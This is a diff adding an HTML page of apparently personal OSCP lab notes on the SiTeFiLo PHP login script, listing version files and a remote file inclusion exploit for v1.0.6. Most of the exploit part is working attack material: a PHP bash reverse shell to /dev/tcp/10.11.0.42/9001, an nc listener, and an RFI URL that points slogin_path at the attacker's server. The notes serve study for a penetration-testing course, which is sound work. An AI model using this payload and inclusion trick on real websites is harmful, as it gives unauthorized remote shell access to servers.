@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Simple Text-File Login script (SiTeFiLo)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Simple Text-File Login script (SiTeFiLo)</h1></strong><br /><a href="https://www.mariovaldez.net/software/sitefilo/">https://www.mariovaldez.net/software/sitefilo/</a><br /><br />Simple Text-File Login script &quot;is a simple authentication script written in PHP to be used in small websites without SQL database, using a simple text file to store the users and passwords. It allows you to password-protect any webpage of your site.&quot;<br /><br /><strong>Examples</strong><br />• OSCP 10.11.1.133 - gh0st<br /><br /><strong><h2>## Find Version and Info</h2></strong><br /><code>/readme.txt</code><br /><code>/version.txt</code><br /><code>/install.txt</code><br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### v.1.0.6 - RFI</h3></strong><br /><a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a><br /><br />When requesting your own web server, the web requests via RFI request: <br /><code>/header.inc.php<br />/slogin.inc.php<br />/footer.inc.php</code><br />    <br />1. Create a <code>header.inc.php</code> file with reverse shell<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.133/serve]<br />└──╼&nbsp;#nano&nbsp;header.inc.php&nbsp;<br />&lt;?php&nbsp;exec(&quot;/bin/bash&nbsp;-c&nbsp;&#39;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.11.0.42/9001&nbsp;0&gt;&amp;1&#39;&quot;);&nbsp;?&gt;</div></div><br /><br />2. Start listener<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.133]<br />└──╼&nbsp;#nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...</div></div><br /><br />3. Run RFI to get shell<br /><a href="http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://10.11.0.42:8000/">http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://10.11.0.42:8000/</a><br /><br /><br /><br /><br /></div>
+</body>
+</html>
